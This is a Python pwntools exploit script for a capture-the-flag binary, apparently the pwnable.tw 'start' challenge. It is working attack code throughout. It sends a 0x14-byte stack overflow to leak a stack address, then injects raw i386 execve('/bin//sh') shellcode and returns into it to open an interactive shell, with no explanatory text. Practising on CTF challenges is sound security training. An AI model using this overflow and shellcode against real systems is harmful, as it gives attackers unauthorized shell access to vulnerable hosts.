#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(os='linux', log_level='debug')
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'

DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    #p = remote('chall.pwnable.tw', 10000)
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
else:
    p = process('./pwn')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

if __name__ == '__main__':
    payload = flat('a' * 0x14, 0x08048087)
    p.sa('Let\'s start the CTF:', payload)
    stack_addr = u32(p.r(4))
    success('stack ' + hex(stack_addr))
    sc = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
    payload = flat('a' * 0x14, stack_addr + 0x14, sc)
    sleep(0.1)
    gogogo()
    p.s(payload)
    p.i()
